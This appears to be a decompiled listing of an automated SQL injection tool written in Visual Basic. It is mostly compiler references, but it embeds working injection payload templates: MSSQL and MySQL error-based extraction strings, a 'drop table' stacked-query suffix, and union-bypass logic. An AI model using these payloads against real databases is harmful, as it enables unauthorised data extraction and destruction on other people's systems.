'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: vbCrLf
'N  * ref: "~"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrCat
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: DoEvents
'N  * ref: "Results received ("
'N  * ref: " bytes)"
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: vbCrLf
'N  * ref: "~"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrCat
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: "Results received ("
'N  * ref: " bytes)"
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: Mid(
'N  * ref: vbCrLf
'N  * ref: "~"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarMove
'N  * ref: "Removing temp table"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: "; drop table r3dm0v3_sql--"
'N  * ref: __vbaVarCat
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStr
'N  * ref: "Connection is busy with results for another"
'N  * ref: "Removing temp table successful"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: "Removing temp table failed"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_207()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: Subr_208
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: Trim(
'N  * ref: Left(
'N  * ref: LCase(
'N  * ref: "select"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: __vbaVarCopy
'N  * ref: "Please register to activate!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "(char(126)%2b("
'N  * ref: __vbaStrCat
'N  * ref: ")%2bchar(126))"
'N  * ref: __vbaStrCat
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: "Query result: "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarCat
'N  * ref: ";"
'N  * ref: "--"
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaInStr
'N  * ref: "Query was done"
'N  * ref: __vbaVarCopy
'N  * ref: "Query failed! (maybe its done?! check it yourself)"
'N  * ref: __vbaVarCopy
'N  * ref: Subr_143
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'End Sub
 
'Sub Subr_208()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrCopy
'N  * ref: Asc(
'N  * ref: """"
'N  * ref: "'"
'N  * ref: "'"
'N  * ref: """"
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: Chr(
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: Chr(
'N  * ref: __vbaInStrVar
'N  * ref: __vbaFreeVar
'N  * ref: Chr(
'N  * ref: __vbaVarAdd
'N  * ref: __vbaInStrVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarAdd
'N  * ref: Mid(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: Mid(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_194
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_209()
'N  * ref: __vbaExceptHandler
'N  * ref: "unhex(Hex(cast("
'N  * ref: " as char)))"
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_210()
'N  * ref: __vbaExceptHandler
'N  * ref: "null"
'N  * ref: __vbaVarDup
'N  * ref: "%String_Col%"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_153
'N  * ref: __vbaStrMove
'N  * ref: __vbaUI1I2
'N  * ref: Subr_155
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_211()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrCmp
'N  * ref: " "
'N  * ref: " /*!30000"
'N  * ref: "and(select 1 from(select count(*),concat((select (select %String_Col%) from `information_schema`.tables limit 0,1),floor(rand(0)*2))x from `information_schema`.tables group by x)a) and "
'N  * ref: "("
'N  * ref: __vbaStrCmp
'N  * ref: "1"
'N  * ref: "="
'N  * ref: "1"
'N  * ref: "*/"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_212()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "database()"
'N  * ref: __vbaVarDup
'N  * ref: Subr_209
'N  * ref: "concat(0x7e,0x27,"
'N  * ref: __vbaStrCat
'N  * ref: ",0x27,0x7e)"
'N  * ref: "%String_Col%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarDup
'N  * ref: "database()"
'N  * ref: Subr_209
'N  * ref: "null"
'N  * ref: "concat(0x7e,0x27,"
'N  * ref: __vbaStrCat
'N  * ref: ",0x27,0x7e)"
'N  * ref: Subr_153
'N  * ref: __vbaUI1I2
'N  * ref: Subr_155
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "~'(.*?)'~"
'N  * ref: Subr_165
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: "Bypassing illegal union failed! Turning off this feature"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: "Current DB: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Current DB: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarCopy
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarDup
'N  * ref: "Cannot get current db name!"
'N  * ref: Subr_143
'N  * ref: "[Unknown_DB]"
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
